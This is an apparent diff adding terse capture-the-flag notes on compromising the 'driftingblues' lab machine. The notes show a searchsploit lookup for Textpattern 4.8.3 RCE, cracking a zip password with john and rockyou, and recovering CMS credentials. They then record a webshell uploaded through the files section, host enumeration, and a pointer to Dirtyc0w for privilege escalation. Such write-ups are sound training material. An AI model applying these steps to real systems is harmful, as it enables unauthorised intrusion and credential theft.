@@ -1,0 +1,88 @@
+
+
+
+
+
+
+http://192.168.206.219/textpattern/README
+
+Textpattern CMS 4.8.3
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit Textpattern CMS 4.8.3                 
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+TextPattern CMS 4.8.3 - Remote Code Execution (Authenticated)                      | php/webapps/48943.py
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                            
+
+
+Author hakan tasiyan 
+
+at /spammer.zip we get a file
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# zip2john Downloads/spammer.zip > hash
+ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+myspace4         (spammer.zip/creds.txt)     
+1g 0:00:00:00 DONE (2025-10-12 07:55) 50.00g/s 1228Kp/s 1228Kc/s 1228KC/s christal..280789
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# unzip Downloads/spammer.zip
+Archive:  Downloads/spammer.zip
+[Downloads/spammer.zip] creds.txt password: 
+ extracting: creds.txt               
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat creds.txt           
+mayer:lionheart                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+the exploit didnt work. 
+
+I upload my own webshell in the files section once logged in.
+
+
+http://192.168.206.219/textpattern/files/prettyshell.php
+
+
+www-data@driftingblues:/etc$ uname -a
+Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
+www-data@driftingblues:/etc$ cat /etc/*-release
+PRETTY_NAME="Debian GNU/Linux 7 (wheezy)"
+NAME="Debian GNU/Linux"
+VERSION_ID="7"
+VERSION="7 (wheezy)"
+ID=debian
+ANSI_COLOR="1;31"
+HOME_URL="http://www.debian.org/"
+SUPPORT_URL="http://www.debian.org/support/"
+BUG_REPORT_URL="http://bugs.debian.org/"
+www-data@driftingblues:/etc$ 
+
+
+Dirtyc0w
+
+
+
+
+
+
